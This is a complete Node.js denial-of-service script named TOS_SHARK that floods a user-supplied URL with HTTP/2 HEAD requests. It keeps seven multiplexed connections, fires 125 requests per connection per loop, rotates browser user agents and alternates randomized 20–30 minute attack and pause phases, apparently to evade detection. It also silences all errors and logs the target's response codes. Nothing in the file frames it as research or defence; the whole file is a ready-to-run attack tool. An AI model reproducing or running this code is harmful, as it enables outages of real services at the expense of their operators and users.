const http2 = require('http2');
const https = require('https');
const { URL } = require('url');

class TOS_SHARK {
    constructor(target) {
        const url = new URL(target);
        this.host = url.hostname;
        this.isHttps = url.protocol === 'https:';
        this.target = target;
        
        this.running = true;
        this.attackActive = false;
        this.totalReqs = 0;
        this.startTime = Date.now();
        this.lastLog = Date.now();
        this.reqCounter = 0;
        this.attackStart = 0;
        this.breakStart = 0;
        this.currentMethod = 'H2-MULTIPLEX';
        
        // Attack methods pool - ONLY H2-MULTIPLEX
        this.methods = ['H2-MULTIPLEX'];
        
        // Data pools
        this.userAgents = this.generateUserAgents();
        
        // 7 HTTP/2 connections pool
        this.connections = [];
        this.maxConnections = 7;
        
        // Color codes
        this.colors = {
            reset: '\x1b[0m',
            darkMagenta: '\x1b[35m',
            darkGreen: '\x1b[32m',
            red: '\x1b[91m',
            green: '\x1b[92m',
            yellow: '\x1b[93m'
        };
        
        this.startCycle();
    }

    // ===== DATA GENERATORS =====
    generateUserAgents() {
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36',
            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
        ];
    }

    // ===== CYCLE MANAGEMENT =====
    async startCycle() {
        // Step 1: Create 7 HTTP/2 connections
        this.createConnections();
        
        // Step 2: Main attack loop
        this.attackLoop();
    }

    createConnections() {
        for (let i = 0; i < this.maxConnections; i++) {
            try {
                const client = http2.connect(this.target);
                this.connections.push(client);
                
                // Handle connection errors
                client.on('error', () => {
                    setTimeout(() => {
                        const idx = this.connections.indexOf(client);
                        if (idx !== -1) {
                            try { client.destroy(); } catch(e) {}
                            try {
                                const newClient = http2.connect(this.target);
                                this.connections[idx] = newClient;
                            } catch(e) {}
                        }
                    }, 1000);
                });
            } catch (err) {}
        }
    }

    async attackLoop() {
        while (this.running) {
            const now = Date.now();
            
            if (this.attackActive) {
                if (now - this.attackStart >= (20 * 60000) + Math.random() * (10 * 60000)) {
                    this.startBreak();
                    continue;
                }
                
                await this.attackH2Multiplex();
                
            } else {
                if (now - this.breakStart >= (20 * 60000) + Math.random() * (10 * 60000)) {
                    this.startAttack();
                    continue;
                }
                
                await this.performMaintenance();
                await this.sleepRandom(1000, 3000);
            }
            
            await this.sleepRandom(0.1, 1);
        }
    }

    startAttack() {
        this.attackActive = true;
        this.attackStart = Date.now();
    }

    startBreak() {
        this.attackActive = false;
        this.breakStart = Date.now();
        this.cleanupConnections();
    }

    // ===== ATTACK METHOD =====
    async attackH2Multiplex() {
        for (const client of this.connections) {
            if (client && !client.destroyed && client.socket && !client.socket.destroyed) {
                for (let i = 0; i < 125; i++) {
                    this.sendH2HeadRequest(client);
                    this.totalReqs++;
                    this.reqCounter++;
                }
            }
        }
    }

    sendH2HeadRequest(client) {
        try {
            const req = client.request({
                ':method': 'HEAD',
                ':path': '/',
                ':authority': this.host,
                'user-agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)]
            });
            
            req.on('response', (headers) => {
                this.logStatus(headers[':status']);
                req.destroy();
            });
            
            req.on('error', () => {
                this.logStatus('*.*');
                req.destroy();
            });
            
            req.end();
        } catch (err) {
            this.logStatus('*.*');
        }
    }

    // ===== MAINTENANCE =====
    async performMaintenance() {
        if (global.gc) global.gc();
        this.userAgents = this.generateUserAgents();
        this.cleanupConnections();
        this.createConnections();
    }

    cleanupConnections() {
        for (const client of this.connections) {
            try {
                if (client && !client.destroyed) {
                    client.destroy();
                }
            } catch (e) {}
        }
        this.connections = [];
    }

    // ===== LOGGING WITH COLOR CODING =====
    logStatus(status) {
        const now = Date.now();
        if (now - this.lastLog >= 10000) {
            this.lastLog = now;
            
            // Format: TØR-2M11 = darkMagenta, totalReqs = darkGreen
            const prefix = `${this.colors.darkMagenta}TØR-2M11${this.colors.reset}:${this.colors.darkGreen}${this.totalReqs}${this.colors.reset} ---> `;
            
            // Status code color logic
            let statusColor = this.colors.green; // Default for 2xx
            let statusText = status;
            
            if (status === '*.*') {
                statusColor = this.colors.red;
                statusText = '*.*';
            } else if (typeof status === 'number') {
                if (status >= 500) {
                    // 5xx - Red
                    statusColor = this.colors.red;
                } else if (status >= 400) {
                    // 4xx - Red (including 403)
                    statusColor = this.colors.red;
                } else if (status >= 300) {
                    // 3xx - Yellow (for 3xx redirects)
                    statusColor = this.colors.yellow;
                } else if (status >= 200) {
                    // 2xx - Green
                    statusColor = this.colors.green;
                }
            }
            
            // Output with color coding
            console.log(prefix + `${statusColor}${statusText}${this.colors.reset}`);
        }
    }

    // ===== UTILS =====
    sleepRandom(min, max) {
        const duration = Math.random() * (max - min) + min;
        return new Promise(resolve => setTimeout(resolve, duration));
    }
}

// Run
if (require.main === module) {
    process.on('uncaughtException', () => {});
    process.on('unhandledRejection', () => {});
    
    if (process.argv.length < 3) {
        process.exit(1);
    }
    
    new TOS_SHARK(process.argv[2]);
    
    process.on('SIGINT', () => {
        process.exit(0);
    });
}
